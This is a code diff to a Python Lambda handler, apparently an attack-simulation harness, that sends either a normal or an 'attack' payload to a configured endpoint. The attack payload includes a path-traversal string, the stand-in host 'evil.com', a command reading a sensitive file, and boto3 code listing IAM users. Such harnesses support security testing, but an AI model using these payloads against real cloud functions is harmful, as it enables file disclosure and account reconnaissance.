@@ -14,8 +14,8 @@ attack_payload = {"mode": "attack", "payloads": {
                         "lfi":      "../../../task/var/lambda_handler.py",
                         "host":     "evil.com",
                         "file":     "/tmp/target",
-                        "cmd":      ['cat', '/var/task/lambda_handler.py'],
-                        "code":     "import boto3\nc=boto3.client('iam')\nr=c.get_users()\nprint(r)"
+                        "cmd":      ['cat', '/var/task/sensitive.file'],
+                        "code":     "import boto3\nc=boto3.client('iam')\nr=c.list_users()\nprint(r)"
                     }}
 
 normal_payload = os.environ["normal_payload"]
@@ -23,19 +23,15 @@ normal_payload = os.environ["normal_payload"]
 
 def lambda_handler(event, context):
     if "mode" in event:
+        mode = event["mode"]
+        if mode == "do_normal":
+            payload = json.dumps(json.loads(normal_payload))
+        elif mode == "do_attack":
+            payload = json.dumps(attack_payload)
+        else:
+            print("[ERROR] invalid mode in event")
+            return
         try:
-            mode = event["mode"]
-
-            if mode == "do_normal":
-                payload = json.dumps(json.loads(normal_payload))
-
-            elif mode == "do_attack":
-                payload = json.dumps(attack_payload)
-
-            else:
-                print("[ERROR] invalid mode in event")
-                return
-
             target = os.environ["target_endpoint"]
             req = urllib2.Request(url=target, data=payload)
             urllib2.urlopen(req)
